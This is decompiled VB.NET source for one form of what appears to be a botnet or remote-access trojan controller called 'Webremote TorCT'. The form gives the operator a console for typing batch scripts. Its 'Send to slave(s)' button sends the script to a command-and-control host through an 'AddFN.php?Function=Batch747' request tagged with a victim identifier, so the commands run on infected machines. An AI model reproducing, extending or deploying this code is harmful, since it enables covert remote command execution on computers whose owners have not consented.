Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Webremote_TorCT_5_1.My

Namespace Webremote_TorCT_5_1
    <DesignerGenerated> _
    Public Class CMDScript
        Inherits Form
        ' Methods
        Public Sub New()
            Dim list As List(Of WeakReference) = CMDScript.__ENCList
            SyncLock list
                CMDScript.__ENCList.Add(New WeakReference(Me))
            End SyncLock
            Me.SendCommand = New WebClient
            Me.InitializeComponent
        End Sub

        Private Sub ClearToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.TextBox2.Clear
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.components Is Nothing)) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Dim manager As New ComponentResourceManager(GetType(CMDScript))
            Me.Label1 = New Label
            Me.SendToSlavesToolStripMenuItem = New ToolStripMenuItem
            Me.ClearToolStripMenuItem = New ToolStripMenuItem
            Me.TextBox2 = New TextBox
            Me.TextBox1 = New TextBox
            Me.MenuStrip1 = New MenuStrip
            Me.MenuStrip1.SuspendLayout
            Me.SuspendLayout
            Me.Label1.AutoSize = True
            Dim point As New Point(&H264, &H70)
            Me.Label1.Location = point
            Me.Label1.Name = "Label1"
            Dim size As New Size(&H5F, 13)
            Me.Label1.Size = size
            Me.Label1.TabIndex = 7
            Me.Label1.Text = "&SpecialUser=False"
            Me.SendToSlavesToolStripMenuItem.ForeColor = Color.FromArgb(&HC0, &HFF, &HC0)
            Me.SendToSlavesToolStripMenuItem.Name = "SendToSlavesToolStripMenuItem"
            size = New Size(&H65, 20)
            Me.SendToSlavesToolStripMenuItem.Size = size
            Me.SendToSlavesToolStripMenuItem.Text = "Send to slave(s)"
            Me.ClearToolStripMenuItem.ForeColor = Color.FromArgb(&HC0, &HFF, &HC0)
            Me.ClearToolStripMenuItem.Name = "ClearToolStripMenuItem"
            size = New Size(&H2E, 20)
            Me.ClearToolStripMenuItem.Size = size
            Me.ClearToolStripMenuItem.Text = "Clear"
            Me.TextBox2.BackColor = Color.Black
            Me.TextBox2.BorderStyle = BorderStyle.FixedSingle
            Me.TextBox2.Dock = DockStyle.Fill
            Me.TextBox2.ForeColor = Color.Lime
            point = New Point(0, &H18)
            Me.TextBox2.Location = point
            Me.TextBox2.Multiline = True
            Me.TextBox2.Name = "TextBox2"
            Me.TextBox2.ReadOnly = True
            Me.TextBox2.ScrollBars = ScrollBars.Both
            size = New Size(&H232, &H165)
            Me.TextBox2.Size = size
            Me.TextBox2.TabIndex = 5
            Me.TextBox2.Text = manager.GetString("TextBox2.Text")
            Me.TextBox1.BackColor = Color.Black
            Me.TextBox1.BorderStyle = BorderStyle.FixedSingle
            Me.TextBox1.Dock = DockStyle.Bottom
            Me.TextBox1.ForeColor = Color.Lime
            point = New Point(0, &H17D)
            Me.TextBox1.Location = point
            Me.TextBox1.Name = "TextBox1"
            Me.TextBox1.ScrollBars = ScrollBars.Both
            size = New Size(&H232, 20)
            Me.TextBox1.Size = size
            Me.TextBox1.TabIndex = 4
            Me.MenuStrip1.BackColor = Color.Black
            Me.MenuStrip1.Items.AddRange(New ToolStripItem() { Me.ClearToolStripMenuItem, Me.SendToSlavesToolStripMenuItem })
            point = New Point(0, 0)
            Me.MenuStrip1.Location = point
            Me.MenuStrip1.Name = "MenuStrip1"
            size = New Size(&H232, &H18)
            Me.MenuStrip1.Size = size
            Me.MenuStrip1.TabIndex = 6
            Me.MenuStrip1.Text = "MenuStrip1"
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(&H232, &H191)
            Me.ClientSize = size
            Me.Controls.Add(Me.Label1)
            Me.Controls.Add(Me.TextBox2)
            Me.Controls.Add(Me.TextBox1)
            Me.Controls.Add(Me.MenuStrip1)
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "CMDScript"
            Me.Text = "Script"
            Me.MenuStrip1.ResumeLayout(False)
            Me.MenuStrip1.PerformLayout
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Private Sub SendToSlavesToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.SendCommand.DownloadString((MyProject.Forms.Client.HostName.ToString & "/AddFN.php?Function=Batch747:" & Me.TextBox2.Text & MyProject.Forms.Client.Strvictem.ToString))
                Interaction.MsgBox("Sended", MsgBoxStyle.ApplicationModal, Nothing)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("Could't send..", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub TextBox1_KeyDown(ByVal sender As Object, ByVal e As KeyEventArgs)
            If (e.KeyCode = Keys.Enter) Then
                Me.TextBox2.Text = (Me.TextBox2.Text & Me.TextBox1.Text & ChrW(13) & ChrW(10))
                Me.TextBox1.Clear
            End If
        End Sub

        Private Sub TextBox1_TextChanged(ByVal sender As Object, ByVal e As EventArgs)
        End Sub


        ' Properties
        Friend Overridable Property ClearToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ClearToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ClearToolStripMenuItem_Click)
                If (Not Me._ClearToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ClearToolStripMenuItem.Click, handler
                End If
                Me._ClearToolStripMenuItem = WithEventsValue
                If (Not Me._ClearToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ClearToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Label1 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._Label1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property MenuStrip1 As MenuStrip
            <DebuggerNonUserCode> _
            Get
                Return Me._MenuStrip1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As MenuStrip)
                Me._MenuStrip1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property SendToSlavesToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._SendToSlavesToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.SendToSlavesToolStripMenuItem_Click)
                If (Not Me._SendToSlavesToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._SendToSlavesToolStripMenuItem.Click, handler
                End If
                Me._SendToSlavesToolStripMenuItem = WithEventsValue
                If (Not Me._SendToSlavesToolStripMenuItem Is Nothing) Then
                    AddHandler Me._SendToSlavesToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property TextBox1 As TextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._TextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As TextBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.TextBox1_TextChanged)
                Dim handler2 As KeyEventHandler = New KeyEventHandler(AddressOf Me.TextBox1_KeyDown)
                If (Not Me._TextBox1 Is Nothing) Then
                    RemoveHandler Me._TextBox1.TextChanged, handler
                    RemoveHandler Me._TextBox1.KeyDown, handler2
                End If
                Me._TextBox1 = WithEventsValue
                If (Not Me._TextBox1 Is Nothing) Then
                    AddHandler Me._TextBox1.TextChanged, handler
                    AddHandler Me._TextBox1.KeyDown, handler2
                End If
            End Set
        End Property

        Friend Overridable Property TextBox2 As TextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._TextBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As TextBox)
                Me._TextBox2 = WithEventsValue
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("ClearToolStripMenuItem")> _
        Private _ClearToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("Label1")> _
        Private _Label1 As Label
        <AccessedThroughProperty("MenuStrip1")> _
        Private _MenuStrip1 As MenuStrip
        <AccessedThroughProperty("SendToSlavesToolStripMenuItem")> _
        Private _SendToSlavesToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("TextBox1")> _
        Private _TextBox1 As TextBox
        <AccessedThroughProperty("TextBox2")> _
        Private _TextBox2 As TextBox
        Private components As IContainer
        Private SendCommand As WebClient
    End Class
End Namespace

